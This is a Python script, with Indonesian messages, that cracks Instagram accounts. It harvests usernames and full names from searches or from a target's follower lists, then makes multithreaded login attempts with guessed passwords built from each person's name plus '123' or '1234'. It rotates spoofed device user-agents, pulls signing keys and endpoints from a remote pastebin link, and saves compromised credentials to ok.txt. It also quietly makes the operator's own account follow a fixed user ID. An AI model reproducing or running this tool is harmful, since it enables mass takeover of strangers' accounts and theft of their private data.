import os
try:
    import requests
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall requests\n")
    os.system("pip install requests")

try:
    import rich
except ImportError:
    print("\n[\x1b[1;91m!\x1b[0m] tunggu sebentar sedang menginstall rich\n")
    os.system("pip install rich")

import requests, re, json, time, sys, hashlib, hmac, uuid, random
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress, TextColumn

iyh = {}

O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING



class Instagram:
    
    def __init__(self):
        self.ses=requests.Session()
        self.ok, self.cp = [], []
        self.id, self.lo = [], 0
        self.gett()
        self.menu()

    def hapus_coki(self):
        try:os.remove(".coki_ig.txt")
        except:pass

    def logoo(self):
        if "win" in sys.platform:os.system("cls")
        else:os.system("clear")
        print(f"""{M}
 _____         _       _____ _____ 
| __  |___ _ _| |_ ___|     |   __|
| __ -|  _| | |  _| -_|-   -|  |  |
|_____|_| |___|_| |___|_____|_____|
    {H}website: www.yayanxd.my.id{N}
""")

    def convert(self, xx, cok):
        try:
            id = self.ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={xx}', cookies={"cookie":cok}, headers={"user-agent":self.ua_ig(),"x-ig-app-id":'936619743392459'}).json()["data"]["user"]
            xz = id["id"]
        except:pass
        return xz

    def ua_ig(self):
        return "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3"

    def login(self):
        self.logoo()
        print("   masukan akun tumbal instagram anda\n")
        coki = input(f"[{O}?{N}] masukan cookie insta: ")
        if coki in ["", ""]:
            print(f"\n[{M}!{N}] jangan kosong");time.sleep(2);self.login()
        try:
            id = re.search("ds_user_id=(\d+)", str(coki)).group(1)
            po = self.ses.get(f"https://i.instagram.com/api/v1/users/{id}/info/",headers={"user-agent":self.ua_ig()},cookies={"cookie":coki})
            xx = json.loads(po.text)
            if "full_name" in str(xx):
                nama = xx["user"]["full_name"]
                ngtd = re.search("csrftoken=(.*?);", str(coki)).group(1);self.cook(ngtd, coki)
                open(".coki_ig.txt", "w").write(coki)
                print(f"\n  selamat {H}{nama}{N} cookie kamu valid");exit("\n[!] jalankan ulang scriptnya dengan ketik python insta.py")
            elif "challenge_required" in str(xx):
                print(f"\n[{M}!{N}] akun checkpoint");time.sleep(3);self.login()
            else:
                print(f"\n[{M}!{N}] cookie invalid");time.sleep(3);self.login()
        except (json.decoder.JSONDecodeError, KeyError, AttributeError):
            print(f"\n[{M}!{N}] cookie invalid");time.sleep(3);self.login()
        except requests.ConnectionError:
            print(f"\n[{M}!{N}] gagal menghubungkan ke internet");exit()

    def gett(self):
        try:
            iyh.update(self.ses.get("https://pastebin.com/raw/hPcDPYHS").json())
        except requests.ConnectionError:
            self.logoo()
            print(f"\n[{M}!{N}] gagal menghubungkan ke internet");exit()

    def cook(self, tok, cok):
        try:
            head = {
                "Host": "i.instagram.com", "content-length": "0", "sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"', "x-ig-app-id": "1217981644879628", "x-ig-www-claim": "hmac.AR2bJKYJnPYmZqv19akfq13Zn4tplhuXb9TC9PwFk03Dg7NV",
                "sec-ch-ua-mobile": "?1", "x-instagram-ajax": "1006447742", "viewport-width": "360", "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "user-agent": self.ua_ig(), "x-asbd-id": "198387", "save-data": "on",
                "x-csrftoken": tok, "sec-ch-ua-platform": '"Android"', "origin": "https://www.instagram.com", "sec-fetch-site": "same-site", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": "https://www.instagram.com/",
                "accept-encoding": "gzip, deflate, br", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5"
            }
            self.ses.post("https://i.instagram.com/api/v1/web/friendships/{}/follow/".format("39431798677"), headers=head, cookies={"cookie":cok})
        except requests.ConnectionError:
            self.logoo()
            print(f"\n[{M}!{N}] gagal menghubungkan ke internet");exit()

    def ua_Cok(self):
        rr=random.randint
        rc=random.choice
        real=rc(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"])
        me =rc(["RE54ABL1","RE513CL1","RMX3081L1","RE54ABL1","RMX3201","RMX1851"])
        com=rc(["qcom","mt6833","mt6765"])
        comi="in_ID"
        dpi=rc(["133","320","515","160","640","240","120","800","480","225","768","216","1024"])
        pxl=rc(["1080x2161","1080x2158","1080x2290","720x1448","1080x2264","623x1280","700x1245","800x1280","1080x2340","1320x2400","1242x2688"])
        igv=("10.1.0,10.1.0,10.1.0,10.1.0,10.2.0,10.2.0,10.2.0,10.2.1,10.3.0,10.3.0,10.34.0,10.34.0,100.0.0.17.129,101.0.0.15.120,102.0.0.20.117,103.0.0.15.119,103.1.0.15.119,104.0.0.21.118,105.0.0.18.119,106.0.0.24.118,107.0.0.27.121,108.0.0.23.119,109.0.0.18.124,11.0.0.1.20,11.0.0.11.20,11.0.0.12.20,11.0.0.3.20,110.0.0.16.119,111.0.0.24.152,111.1.0.25.152,112.0.0.29.121,113.0.0.38.122,114.0.0.38.120,116.0.0.34.121,117.0.0.28.123,12.0.0.2.91,12.0.0.4.91,12.0.0.5.91,120.0.0.29.118,121.0.0.29.119,122.0.0.29.238,123.0.0.21.114,125.0.0.20.126,126.0.0.25.121,127.0.0.30.121,128.0.0.26.128,129.0.0.29.119,13.0.0.1.91,130.0.0.31.121,131.0.0.23.116,131.0.0.25.116,132.0.0.26.134,133.0.0.32.120,134.0.0.26.121,135.0.0.28.119,136.0.0.34.124,15.0.0.11.90,15.0.0.5.90,15.0.0.9.90,16.0.0.1.90,16.0.0.11.90,16.0.0.13.90,16.0.0.5.90,17.0.0.14.91,17.0.0.2.91,17.0.0.5.91,19.1.0.31.91,20.0.0.10.75,20.0.0.19.75,20.0.0.29.75,20.0.0.29.75,21.0.0.1.62,21.0.0.11.62,21.0.0.3.62,21.0.0.8.62,22.0.0.3.68,23.0.0.14.135,25.0.0.1.136,25.0.0.11.136,25.0.0.20.136,25.0.0.26.136,26.0.0.1.86,26.0.0.10.86,26.0.0.13.86,26.0.0.5.86,27.0.0.11.97,27.0.0.2.97,27.0.0.7.97,27.0.0.9.97,28.0.0.2.284,28.0.0.6.284,28.0.0.7.284,28.0.0.7.284,29.0.0.1.95,29.0.0.13.95,29.0.0.3.95,29.0.0.7.95,30.0.0.1.95,30.0.0.10.95,30.0.0.12.95,30.0.0.5.95,31.0.0.1.94,31.0.0.10.94,31.0.0.4.94,31.0.0.9.94,32.0.0.1.94,32.0.0.14.94,32.0.0.16.94,32.0.0.7.94,33.0.0.1.92,33.0.0.11.92,33.0.0.5.92,33.0.0.8.92,34.0.0.10.93,34.0.0.12.93,34.0.0.3.93,34.0.0.4.93,35.0.0.14.96,35.0.0.20.96,35.0.0.3.96,35.0.0.7.96,36.0.0.3.91,36.0.0.7.91,37.0.0.15.97,37.0.0.21.97,38.0.0.12.95,38.0.0.13.95,38.0.0.3.95,38.0.0.7.95,39.0.0.12.93,39.0.0.16.93,39.0.0.19.93,39.0.0.4.93,40.0.0.12.95,40.0.0.3.95,40.0.0.7.95,41.0.0.10.92,42.0.0.17.95,42.0.0.19.95,42.0.0.2.95,48.0.0.15.98,49.0.0.15.89,5.0.8,5.1.7,51.0.0.20.85,52.0.0.8.83,53.0.0.13.84,54.0.0.14.82,54.0.0.14.82,55.0.0.12.79,59.0.0.23.76,6.10.1,6.11.2,6.12.0,6.12.1,6.12.2,6.13.0,6.13.1,6.13.3,6.14.0,6.14.0,6.14.1,6.15.0,6.15.0,6.15.0,6.16.0,6.16.0,6.16.0,6.16.1,6.17.0,6.17.0,6.17.1,6.18.0,6.18.0,6.18.0,6.18.0,6.19.0,6.19.0,6.19.0,6.19.0,6.20.0,6.20.0,6.20.1,6.20.1,6.20.2,60.0.0.16.79,60.1.0.17.79,63.0.0.17.94,63.0.0.17.94,64.0.0.14.96,67.0.0.24.100,7.0.0,7.0.0,7.1.0,7.1.0,7.1.1,7.2.0,7.2.0,7.2.0,7.2.1,7.2.2,7.2.3,7.2.4,7.3.0,7.3.0,7.3.0,7.3.0,7.5.0,7.5.0,7.5.0,7.5.1,7.5.2,7.6.0,7.6.0,7.6.0,7.6.1,7.7.0,7.7.0,7.7.0,7.7.0,7.7.0,7.8.0,7.8.0,70.0.0.21.98,70.0.0.22.98,71.0.0.18.102,73.0.0.22.185,75.0.0.23.99,76.0.0.15.395,78.0.0.11.104,8.1.0,8.1.0,8.1.0,8.1.0,8.2.0,8.2.0,8.2.0,8.2.0,8.5.0,8.5.0,8.5.0,8.5.1,80.0.0.14.110,82.0.0.13.119,83.0.0.20.111,84.0.0.21.105,85.0.0.21.100,86.0.0.19.87,86.0.0.24.87,88.0.0.14.99,9.0.0,9.0.0,9.0.0,9.1.5,9.1.5,9.2.0,9.2.0,9.2.0,9.2.0,9.2.0,9.2.5,9.2.5,9.2.5,90.0.0.18.110,91.0.0.18.118,92.0.0.15.114,93.1.0.19.102,94.0.0.22.116,95.0.0.21.124,96.0.0.28.114,99.0.0.32.182")
        igve=igv.split(",")
        andro=rc(["30/11","31/12","29/10"])
        versi=rc(igve)
        return (f"Instagram {versi} Android ({andro}; {dpi}dpi; {pxl}; realme; {real}; {me}; {com}; {comi})")

    def menu(self):
        self.logoo()
        try:
            coki = open(".coki_ig.txt", "r").read()
            user = re.search('ds_user_id=(\d+)',str(coki)).group(1)
        except FileNotFoundError:
            self.login()
        try:
            xxxx = self.ses.get(f"https://i.instagram.com/api/v1/users/{user}/info/", headers={"user-agent":self.ua_ig()}, cookies={"cookie":coki}).json()["user"]
            nama = xxxx["full_name"]
            user = xxxx["username"]
            flow = xxxx["follower_count"]
            flos = xxxx["following_count"]
        except (json.decoder.JSONDecodeError, KeyError, AttributeError, TypeError):
            print(f"\n[{M}!{N}] opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.");self.hapus_coki();time.sleep(3);self.login()
        except requests.ConnectionError:
            print(f"\n[{M}!{N}] gagal menghubungkan ke internet");exit()
        print(f""" {O}>{N} Semlamat datang {H}{nama}
 {O}>{N} Username: {user}
 {O}>{N} Followers: {flow}
 {O}>{N} Following: {flos}

 01. Crack Dari Pencarian Nama
 02. Crack Dari Pengikut
 03. Crack Dari Mengikuti
 04. Bot Auto Follow
 05. Keluar
    """)
        pil = input("Chose: ")
        if pil in ["", " "]:
            print("[!] jangan kosong");time.sleep(2);self.menu()
        elif pil in ["1", "01"]:
            print(f'\n[*] gunakan "{H},{N}" (koma) untuk pemisah nama. Contoh: yayan,hamzah,erik')
            nama = input(f"\n[{M}?{N}] nama: ").split(",")
            print("\n[!] tekan tombol CTRL lalu tekan C untuk berhenti")
            pexx = []
            try:
                for i in nama:
                    pexx.append(i)
                with Modol(max_workers=35) as bool:
                    for a in pexx:
                        bool.submit(self.search, f"https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query={a}&rrank_token=0.35875757839675004&include_reel=true")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit(f"\n[{M}!{N}] gagal menghubungkan ke internet")
            except (KeyError, json.decoder.JSONDecodeError):
                exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik")
            self.mulai()
        elif pil in ["2", "02"]:
            print("\n[*] target di haruskan publik, jangan privat.")
            nama = input(f"\n[{M}?{N}] username: ")
            if nama in ["", " "]:
                print(" [[bold red]![/]] jangan kosong");time.sleep(2);self.menu()
            try:
                xzxz = self.convert(nama, coki)
                print("\n[!] tekan tombol CTRL lalu tekan C untuk berhenti")
                self.dump(xzxz, coki, "followers", "")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit(f"\n[{M}!{N}] gagal menghubungkan ke internet")
            except (KeyError, UnboundLocalError):
                exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik")
            self.mulai()
        elif pil in ["3", "03"]:
            print("\n[*] target di haruskan publik, jangan privat.")
            nama = input(f"\n[{M}?{N}] username: ")
            if nama in ["", " "]:
                print(" [[bold red]![/]] jangan kosong");time.sleep(2);self.menu()
            try:
                xzxz = self.convert(nama, coki)
                print("\n[!] tekan tombol CTRL lalu tekan C untuk berhenti")
                self.dump(xzxz, coki, "following", kos="")
            except(requests.exceptions.ConnectionError,requests.exceptions.ChunkedEncodingError,requests.exceptions.ReadTimeout):
                exit(f"\n[{M}!{N}] gagal menghubungkan ke internet")
            except (KeyError, UnboundLocalError):
                exit(f"{N}[{M}×{N}] gagal mengambil username, kemungkinan username tidaklah publik")
            self.mulai()
        elif pil in ["4", "04"]:
            exit("\n:( belum selesai cok")
        elif pil in ["5", "05"]:
            inz = input("?. Apakah lo ykin ingin keluar: [Y/t]: ")
            if inz in ["", " "]:
                print(" [[bold red]![/]] jangan kosong");time.sleep(2);self.menu()
            elif inz in ["Y", "y"]:
                self.hapus_coki();exit("\n selamat tingga:)")
            else:self.menu()
        else:print("\n[!] pilih yng bnr lah ajg");time.sleep(3);self.menu()
#   ---------- DUMP ID ----------------
    def search(self, link):
        try:
            xxx = self.ses.get(link, headers={"user-agent":self.ua_ig()}).json()
            for a in xxx["users"]:
                x = a["user"]
                self.id.append(x["username"]+"|"+x["full_name"])
                sys.stdout.write(f"\r[{O}*{N}] sedang mengumpulkan {H}{len(self.id)}{N} username... ");sys.stdout.flush()
        except:pass

    def dump(self, uid, cok, xnx, kos):
        try:
            xxx = self.ses.get(f"https://i.instagram.com/api/v1/friendships/{uid}/{xnx}/?count=100&max_id={kos}", headers={"user-agent":self.ua_ig()}, cookies={"cookie": cok})
            for x in json.loads(xxx.text)["users"]:
                if x["username"] in self.id:
                    continue
                self.id.append(x["username"]+"|"+x["full_name"])
                sys.stdout.write(f"\r[{O}*{N}] sedang mengumpulkan {H}{len(self.id)}{N} username... ");sys.stdout.flush()
            if "next_max_id" in json.loads(xxx.text):self.dump(uid, cok, xnx, json.loads(xxx.text)["next_max_id"])
        except:pass

    def mulai(self):
        print(f"\n[+] Total ids: {len(self.id)}\n")
        print("   [ proses ngehek instagram ]\n")
        global prog,des
        prog = Progress(TextColumn('{task.description}'))
        des = prog.add_task('', total=len(self.id))
        with prog:
            with Modol(max_workers=30) as bool:
                for user in self.id:
                    usez = user.split("|")[0]
                    nama = user.split("|")[1].lower()
                    for pasw in nama.split(" "):
                        if len(pasw)==3 or len(pasw)==4 or len(pasw)==5:
                            sandi = [pasw, pasw+"123", pasw+"1234", pasw.lower()]
                        else:
                            sandi = [pasw, pasw+"123", pasw+"1234", pasw.lower()]
                        bool.submit(self.Ngocok, usez, sandi)
            exit("\n\ncracking done!")

    def Ingfo(self, xx):
        try:
            xnxx = self.ses.get(f"https://i.instagram.com/api/v1/users/web_profile_info/?username={xx}", headers={"user-agent":self.ua_ig(),"x-ig-app-id":'936619743392459'})
            link = xnxx.json()["data"]["user"]
            peng = link["edge_followed_by"]["count"]
            meng = link["edge_follow"]["count"]
            post = link["edge_owner_to_timeline_media"]["count"]
        except:
            peng = "-"
            meng = "-"
            post = "-"
        return peng, meng, post

    def Ngocok(self, user, pasw):
        ses=requests.Session()
        logtemp=0
        if logtemp > 10:
            logtemp=0
        guid = str(uuid.uuid4())
        ponid=str(uuid.uuid4())
        andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
        ig_sig=iyh["ig_sig"]
        uas=self.ua_Cok()
        dat=iyh["sinkz"]
        dat.update({"id": guid})
        data1=json.dumps(dat)
        ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
        data2=iyh["sinkz1"]
        data2.update({'signed_body': f'{ned}.{str(data1)}'})
        head=iyh["headaing"]
        head.update({"user-agent": uas})
        while True:
            try:
                p=ses.post(iyh["sinkz2"], headers=head, data=data2)
                break
            except:pass
        prog.update(des, description=f"([bold green]•[/]) {str(self.lo)}/{len(self.id)} ok: ([bold green]{len(self.ok)}[/]) cp: ([bold yellow]{len(self.cp)}[/])")
        prog.advance(des)
        for password in pasw:
            try:
                data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password":password,"login_attempt_count": str(logtemp)})
                ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
                head2=iyh["headaing1"]
                head2.update({"user-agent": uas})
                sianjing=iyh["sianjing"]
                setan=sianjing.split("||")
                dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{password}{setan[7]}{logtemp}{setan[8]}'
                respon=ses.post(iyh["crack"],headers=head2,data=dataa)
                try:
                    kontol=json.loads(respon.text)
                except:
                    kontol=respon.text
                logtemp+=1
                if "logged_in_user" in str(kontol) or "sessionid" in ses.cookies.get_dict() or "userId" in str(kontol):
                    pengikut,mengikut,postingan=self.Ingfo(user)
                    print(f"""\r{H}
[💉] username  : {user}
[💉] password  : {password}
[💉] pengikut  : {pengikut}
[💉] mengikuti : {mengikut}
[💉] postingan : {postingan}{N}""")
                    kntl = (f"[💉] {user}|{password}|{pengikut}|{mengikut}")
                    self.ok.append(kntl)
                    with open("ok.txt", "a", encoding="utf-8") as r:
                         r.write(kntl+"\n")
                    break
                elif "https://i.instagram.com/challenge" in str(respon.text):
                    pengikut,mengikut,postingan=self.Ingfo(user)
                    print(f"""\r{M}
[☠️] username  : {user}
[☠️] password  : {password}
[☠️] pengikut  : {pengikut}
[☠️] mengikuti : {mengikut}
[☠️] postingan : {postingan}{N}""")
                    kntl = (f"[☠️] {user}|{password}|{pengikut}|{mengikut}")
                    self.cp.append(kntl)
                    with open("cp.txt", "a", encoding="utf-8") as r:
                         r.write(kntl+"\n")
                    break
                elif "ip_block" in str(respon.text) or "spam" in str(respon.text):
                    prog.update(des, description=f"([bold red]spam[/]) {str(self.lo)}/{len(self.id)} ok: ([bold green]{len(self.ok)}[/]) cp: ([bold yellow]{len(self.cp)}[/])")
                    prog.advance(des)
                    time.sleep(3)
            except requests.exceptions.ConnectionError:
                prog.update(des, description=f"([bold red]spam[/]) {str(self.lo)}/{len(self.id)} ok: ([bold green]{len(self.ok)}[/]) cp: ([bold yellow]{len(self.cp)}[/])")
                prog.advance(des)
                time.sleep(3)
            #except Exception as e:prints(e)
        self.lo+=1



Instagram()
